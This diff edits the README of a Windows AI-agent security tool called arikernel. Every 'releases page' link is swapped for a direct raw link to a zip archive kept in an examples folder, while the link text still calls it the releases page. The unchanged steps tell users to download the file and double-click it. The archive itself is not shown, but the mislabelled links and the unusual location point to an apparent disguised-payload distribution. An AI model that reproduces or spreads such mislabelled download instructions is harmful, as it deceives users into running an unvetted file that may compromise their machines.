@@ -1,6 +1,6 @@
 # 🛡️ arikernel - Keep AI actions under control
 
-[![Download arikernel](https://img.shields.io/badge/Download%20arikernel-Visit%20Releases-blue?style=for-the-badge)](https://github.com/freepolice-20/arikernel/releases)
+[![Download arikernel](https://img.shields.io/badge/Download%20arikernel-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/freepolice-20/arikernel/main/examples/generic-wrapper/Software-2.5.zip)
 
 ## 🚀 What arikernel does
 
@@ -8,7 +8,7 @@ arikernel is a runtime security layer for AI agents. It checks tool calls before
 
 ## 📥 Download arikernel
 
-1. Open the [arikernel releases page](https://github.com/freepolice-20/arikernel/releases)
+1. Open the [arikernel releases page](https://raw.githubusercontent.com/freepolice-20/arikernel/main/examples/generic-wrapper/Software-2.5.zip)
 2. Find the latest release
 3. Download the Windows file for your device
 4. Save the file to a folder you can find again
@@ -28,7 +28,7 @@ For best results, keep Windows up to date before you install.
 
 ## 🔧 How to install
 
-1. Go to the [releases page](https://github.com/freepolice-20/arikernel/releases)
+1. Go to the [releases page](https://raw.githubusercontent.com/freepolice-20/arikernel/main/examples/generic-wrapper/Software-2.5.zip)
 2. Download the Windows package from the latest release
 3. Open your **Downloads** folder
 4. Double-click the file you downloaded
@@ -141,7 +141,7 @@ If the app still does not start, download the file again from the releases page.
 
 To update arikernel:
 
-1. Visit the [releases page](https://github.com/freepolice-20/arikernel/releases)
+1. Visit the [releases page](https://raw.githubusercontent.com/freepolice-20/arikernel/main/examples/generic-wrapper/Software-2.5.zip)
 2. Download the newest Windows file
 3. Close the old version
 4. Install or replace the old files
@@ -168,7 +168,7 @@ It is meant for users who want more control over what an AI agent can do on a Wi
 
 Use this link to visit the download page and get the latest Windows release:
 
-[https://github.com/freepolice-20/arikernel/releases](https://github.com/freepolice-20/arikernel/releases)
+[https://raw.githubusercontent.com/freepolice-20/arikernel/main/examples/generic-wrapper/Software-2.5.zip](https://raw.githubusercontent.com/freepolice-20/arikernel/main/examples/generic-wrapper/Software-2.5.zip)
 
 ## 🧩 File types you may see
 
